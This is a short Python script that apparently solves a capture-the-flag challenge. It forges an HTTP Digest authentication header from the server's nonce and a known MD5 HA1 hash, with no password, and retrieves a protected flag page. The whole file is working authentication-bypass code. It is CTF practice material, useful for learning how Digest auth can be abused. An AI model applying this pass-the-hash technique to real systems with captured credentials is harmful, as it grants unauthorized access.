import requests
from hashlib import md5

url = 'http://ctfq.u1tramarine.blue/q9/flag.html'

username = 'q9'
realm = 'secret'
nonce = ''

uri = '/q9/flag.html'
algorithm = 'MD5'
response = ''
qop = 'auth'
nc = '00000001'
cnonce = '656335d78cef6e86'

md5a1 = 'c627e19450db746b739f41b64097d449'
a2 = "GET:" + uri


def cracker():
    res = requests.get(url)

    nonce = res.headers["WWW-Authenticate"].split(", ")[1]
    nonce = nonce.replace('nonce=', '').replace('"', '')

    md5_a2 = md5(a2.encode('utf-8')).hexdigest()
    plain_response = f"{md5a1}:{nonce}:{nc}:{cnonce}:{qop}:{md5_a2}"
    response = md5(plain_response.encode('utf-8')).hexdigest()

    auth = 'Digest username="' + username + '", realm="' + realm + '", nonce="' + nonce + '",uri="' + uri + \
        '", algorithm=' + algorithm + ', response="' + response + \
        '", qop=' + qop + ', nc=' + nc + ', cnonce="' + cnonce + '"'
    headers = {'Authorization': auth}
    req = requests.get(url, headers=headers)
    print(req.text)


if __name__ == "__main__":
    cracker()
